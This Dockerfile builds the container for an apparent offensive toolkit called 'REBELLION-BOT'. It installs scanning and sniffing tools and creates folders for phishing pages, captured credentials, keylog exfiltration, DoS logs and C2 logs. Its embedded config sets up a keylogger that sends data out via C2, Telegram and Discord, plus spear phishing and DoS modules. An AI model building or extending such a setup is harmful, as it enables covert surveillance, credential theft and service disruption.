# REBELLION-BOT Dockerfile
# Multi-stage build for Alpine Linux

# Stage 1: Build stage
FROM alpine:3.19 AS builder

# Install build dependencies
RUN apk add --no-cache \
    python3 \
    py3-pip \
    py3-virtualenv \
    python3-dev \
    build-base \
    libffi-dev \
    openssl-dev \
    libxml2-dev \
    libxslt-dev \
    linux-headers \
    git \
    wget \
    nmap \
    nikto \
    curl \
    netcat-openbsd \
    bind-tools \
    whois \
    traceroute \
    iptables \
    tcpdump \
    gcc \
    musl-dev

# Create virtual environment
RUN python3 -m venv /opt/venv
ENV PATH="/opt/venv/bin:$PATH"

# Copy requirements
COPY requirements.txt .

# Install Python packages
RUN pip install --no-cache-dir --upgrade pip setuptools wheel && \
    pip install --no-cache-dir -r requirements.txt

# Stage 2: Final stage
FROM alpine:3.19

# Install runtime dependencies
RUN apk add --no-cache \
    python3 \
    nmap \
    nikto \
    curl \
    netcat-openbsd \
    bind-tools \
    whois \
    traceroute \
    iptables \
    tcpdump \
    bash \
    sudo

# Copy virtual environment from builder
COPY --from=builder /opt/venv /opt/venv
ENV PATH="/opt/venv/bin:$PATH"

# Create app directory
WORKDIR /app

# Copy application files
COPY rebellion_bot.py .
COPY run.sh .
COPY install.sh .

# Create directory structure
RUN mkdir -p .rebellion_bot \
    .rebellion_bot/payloads \
    .rebellion_bot/workspaces \
    .rebellion_bot/scans \
    .rebellion_bot/phishing_pages \
    .rebellion_bot/phishing_templates \
    .rebellion_bot/captured_credentials \
    .rebellion_bot/ssh_keys \
    .rebellion_bot/traffic_logs \
    .rebellion_bot/nikto_results \
    .rebellion_bot/keylog_exfil \
    .rebellion_bot/deployments \
    .rebellion_bot/domain_hosting \
    .rebellion_bot/sessions \
    .rebellion_bot/spear_phishing \
    .rebellion_bot/email_templates \
    .rebellion_bot/dos_logs \
    .rebellion_bot/agents \
    .rebellion_bot/c2_logs \
    .rebellion_bot/modules \
    .rebellion_bot/network_monitor \
    .rebellion_bot/web_templates \
    rebellion_reports \
    rebellion_reports/graphics \
    temp

# Create config
RUN echo '{\n\
    "version": "1.0.0",\n\
    "auto_start": false,\n\
    "auto_block_enabled": false,\n\
    "auto_block_threshold": 5,\n\
    "scan_timeout": 30,\n\
    "report_format": "both",\n\
    "generate_graphics": true,\n\
    "keylogger": {\n\
        "enabled": false,\n\
        "hotkey": "f10",\n\
        "log_file": ".rebellion_bot/keylog.txt",\n\
        "c2_server": "",\n\
        "upload_interval": 30,\n\
        "exfil_methods": ["file", "email", "c2", "telegram", "discord"],\n\
        "screenshot_interval": 60,\n\
        "capture_clipboard": true\n\
    },\n\
    "web": {\n\
        "enabled": false,\n\
        "port": 5000,\n\
        "host": "0.0.0.0",\n\
        "require_auth": true,\n\
        "username": "admin"\n\
    },\n\
    "spear_phishing": {\n\
        "enabled": true,\n\
        "smtp_server": "",\n\
        "smtp_port": 587,\n\
        "track_opens": true,\n\
        "track_clicks": true\n\
    },\n\
    "dos": {\n\
        "enabled": true,\n\
        "max_threads": 100,\n\
        "default_timeout": 60\n\
    },\n\
    "reports": {\n\
        "enabled": true,\n\
        "auto_generate": true,\n\
        "format": "pdf",\n\
        "include_graphics": true,\n\
        "save_path": "rebellion_reports"\n\
    }\n\
}' > .rebellion_bot/config.json

# Set permissions
RUN chmod +x rebellion_bot.py run.sh install.sh

# Expose ports
EXPOSE 5000 8080

# Run the application
CMD ["./run.sh"]